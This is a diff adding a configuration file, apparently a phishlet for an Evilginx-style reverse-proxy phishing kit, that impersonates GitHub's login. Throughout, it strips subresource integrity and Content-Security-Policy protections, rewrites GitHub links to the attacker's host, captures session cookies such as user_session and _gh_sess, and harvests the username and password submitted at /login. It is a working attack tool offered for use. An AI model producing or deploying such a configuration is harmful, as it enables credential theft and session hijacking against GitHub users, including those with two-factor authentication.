@@ -1,0 +1,38 @@
+author: '@audibleblink'
+min_ver: '2.3.0'
+
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'github.com', session: true, is_landing: true}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'github.com', session: true, is_landing: false}
+  - {phish_sub: 'github', orig_sub: 'github', domain: 'githubassets.com', session: false, is_landing: false}
+
+sub_filters:
+  - {triggers_on: 'github.com', orig_sub: '', domain: 'github.com', search: 'integrity="(.*?)"', replace: '', mimes: ['text/html']}
+  - {triggers_on: 'github.com', orig_sub: '', domain: 'github.com', search: 'https://github.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/javascript']}
+  - {triggers_on: 'github.com', orig_sub: '', domain: 'github.com', search: 'github.com', replace: '{hostname}', mimes: ['text/html', 'application/javascript']}
+  - {triggers_on: 'github.com', orig_sub: '', domain: 'github.com', search: '<meta http-equiv="Content-Security-Policy".*?>', replace: '', mimes: ['text/html']}
+  - {triggers_on: 'github.com', orig_sub: '', domain: 'github.com', search: 'content-security-policy', replace: '', mimes: ['text/html']}
+
+auth_tokens:
+  - domain: '.github.com'
+    keys: ['logged_in', 'dotcom_user']
+  - domain: 'github.com'
+    keys: ['user_session', '_gh_sess']
+
+auth_urls:
+  - '/settings/profile'
+  - '/dashboard'
+
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'github.com'
+  path: '/login'
